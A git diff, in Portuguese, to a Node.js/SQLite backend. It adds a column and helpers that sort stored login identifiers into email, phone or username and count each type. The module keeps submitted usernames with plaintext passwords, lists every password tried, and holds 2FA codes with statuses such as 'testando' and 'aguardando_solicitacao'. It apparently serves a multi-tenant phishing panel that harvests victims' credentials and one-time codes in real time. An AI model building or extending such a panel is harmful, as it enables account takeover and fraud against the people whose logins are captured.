@@ -94,6 +94,20 @@ try {
     migrarColunaTenant("audit_logs");
     migrarColunaTenant("sessoes");
 
+    function migrarColunaTipo(tabela) {
+        try {
+            const cols = db.prepare(`PRAGMA table_info(${tabela})`).all();
+            const existe = cols.some(c => c.name === "tipo_identificador");
+            if (!existe) {
+                db.exec(`ALTER TABLE ${tabela} ADD COLUMN tipo_identificador TEXT DEFAULT 'usuario';`);
+                console.log(`[DB] 🚀 Coluna 'tipo_identificador' migrada com sucesso na tabela '${tabela}'`);
+            }
+        } catch (e) {
+            console.warn(`[DB] Aviso na verificação de coluna tipo_identificador em ${tabela}:`, e.message);
+        }
+    }
+    migrarColunaTipo("logins");
+
     // Criação dos índices após confirmação das colunas
     db.exec(`
         CREATE INDEX IF NOT EXISTS idx_logins_usuario ON logins(usuario);
@@ -243,6 +257,43 @@ function autoMigrarDadosLegados() {
 }
 
 // Inicializa a migração automática
+function detectarTipoIdentificador(str) {
+    if (!str) return "usuario";
+    const s = String(str).trim();
+    if (s.includes("@") && s.includes(".")) return "email";
+    const digitos = s.replace(/\D/g, "");
+    if (digitos.length >= 8 && /^\+?[\d\s().-]{8,22}$/.test(s)) {
+        return "telefone";
+    }
+    return "usuario";
+}
+
+function formatarIdentificador(str, tipo = null) {
+    if (!str) return "—";
+    const s = String(str).trim();
+    const t = tipo || detectarTipoIdentificador(s);
+    if (t === "email") {
+        return s.toLowerCase();
+    }
+    if (t === "telefone") {
+        const digitos = s.replace(/\D/g, "");
+        if (digitos.length === 11) {
+            return `(${digitos.slice(0, 2)}) ${digitos.slice(2, 7)}-${digitos.slice(7)}`;
+        }
+        if (digitos.length === 10) {
+            return `(${digitos.slice(0, 2)}) ${digitos.slice(2, 6)}-${digitos.slice(6)}`;
+        }
+        if (digitos.length === 13 && digitos.startsWith("55")) {
+            return `+55 (${digitos.slice(2, 4)}) ${digitos.slice(4, 9)}-${digitos.slice(9)}`;
+        }
+        return s;
+    }
+    if (t === "usuario") {
+        return s.startsWith("@") ? s : `@${s}`;
+    }
+    return s;
+}
+
 autoMigrarDadosLegados();
 
 module.exports = {
@@ -250,22 +301,25 @@ module.exports = {
     useSqlite,
     atomicWriteJson,
     sincronizarJsonArquivos,
+    detectarTipoIdentificador,
+    formatarIdentificador,
 
     // Operações de Login
-    salvarLogin({ usuario, senha, ip = "", userAgent = "", tenant = "default" }) {
+    salvarLogin({ usuario, senha, ip = "", userAgent = "", tenant = "default", tipo_identificador = null }) {
         const now = Date.now();
         const dataHora = new Date().toLocaleString("pt-BR");
         const t = (tenant || "default").trim() || "default";
+        const tipo = tipo_identificador || detectarTipoIdentificador(usuario);
         if (useSqlite) {
             const stmt = db.prepare(`
-                INSERT INTO logins (tenant, usuario, senha, status_login, status_credencial, data_hora, ip, user_agent, created_at)
-                VALUES (?, ?, ?, 'aguardando_solicitacao', 'testando', ?, ?, ?, ?)
+                INSERT INTO logins (tenant, usuario, senha, tipo_identificador, status_login, status_credencial, data_hora, ip, user_agent, created_at)
+                VALUES (?, ?, ?, ?, 'aguardando_solicitacao', 'testando', ?, ?, ?, ?)
             `);
-            const info = stmt.run(t, usuario, senha, dataHora, ip, userAgent, now);
+            const info = stmt.run(t, usuario, senha, tipo, dataHora, ip, userAgent, now);
             sincronizarJsonArquivos();
-            return { id: info.lastInsertRowid, tenant: t, usuario, dataHora };
+            return { id: info.lastInsertRowid, tenant: t, usuario, tipo_identificador: tipo, dataHora };
         }
-        return { tenant: t, usuario, dataHora };
+        return { tenant: t, usuario, tipo_identificador: tipo, dataHora };
     },
 
     atualizarStatusCredencial(usuario, statusCredencial, statusLogin = null) {
@@ -434,10 +488,13 @@ module.exports = {
             const u = l.usuario.trim();
             const userKey = u.toLowerCase();
             const t = l.tenant || "default";
+            const tipo = l.tipo_identificador || detectarTipoIdentificador(u);
             if (!mapaUsuarios.has(userKey)) {
                 mapaUsuarios.set(userKey, {
                     tenant: t,
                     usuario: u,
+                    tipo_identificador: tipo,
+                    identificador_formatado: formatarIdentificador(u, tipo),
                     senhas: [],
                     ultimaSenha: "—",
                     codigos: [],
@@ -460,6 +517,8 @@ module.exports = {
             item.data_hora = l.data_hora || item.data_hora;
             item.ultimoEventoTipo = "LOGIN";
             item.tenant = t;
+            item.tipo_identificador = tipo;
+            item.identificador_formatado = formatarIdentificador(u, tipo);
             if (!item.senhas.includes(l.senha)) item.senhas.push(l.senha);
             item.ultimaSenha = l.senha;
             item.status_login = l.status_login || "aguardando_solicitacao";
@@ -471,10 +530,13 @@ module.exports = {
             const u = a.usuario.trim();
             const userKey = u.toLowerCase();
             const t = a.tenant || "default";
+            const tipo = detectarTipoIdentificador(u);
             if (!mapaUsuarios.has(userKey)) {
                 mapaUsuarios.set(userKey, {
                     tenant: t,
                     usuario: u,
+                    tipo_identificador: tipo,
+                    identificador_formatado: formatarIdentificador(u, tipo),
                     senhas: [],
                     ultimaSenha: "—",
                     codigos: [],
@@ -532,8 +594,11 @@ module.exports = {
         for (const d of combined) {
             const sess = sessoesMap.get(d.usuario.toLowerCase());
             const itemTenant = d.tenant || (sess ? sess.tenant : "default");
+            const itemTipo = d.tipo_identificador || detectarTipoIdentificador(d.usuario);
             feed.push({
                 tipo: d.tipo,
+                tipo_identificador: itemTipo,
+                identificador_formatado: formatarIdentificador(d.usuario, itemTipo),
                 tenant: itemTenant,
                 usuario: d.usuario,
                 senha: d.senha || null,
@@ -550,6 +615,15 @@ module.exports = {
             });
         }
 
+        let totalEmails = 0;
+        let totalTelefones = 0;
+        let totalUsernames = 0;
+        for (const item of mapaUsuarios.values()) {
+            if (item.tipo_identificador === "email") totalEmails++;
+            else if (item.tipo_identificador === "telefone") totalTelefones++;
+            else totalUsernames++;
+        }
+
         return {
             success: true,
             tenant: isFiltrado ? tenant : "global",
@@ -557,6 +631,9 @@ module.exports = {
             totalLogins: logins.length,
             total2FA: codigos2fa.length,
             totalUsuarios: mapaUsuarios.size,
+            totalEmails,
+            totalTelefones,
+            totalUsernames,
             consolidados: Array.from(mapaUsuarios.values()).reverse(),
             feed
         };
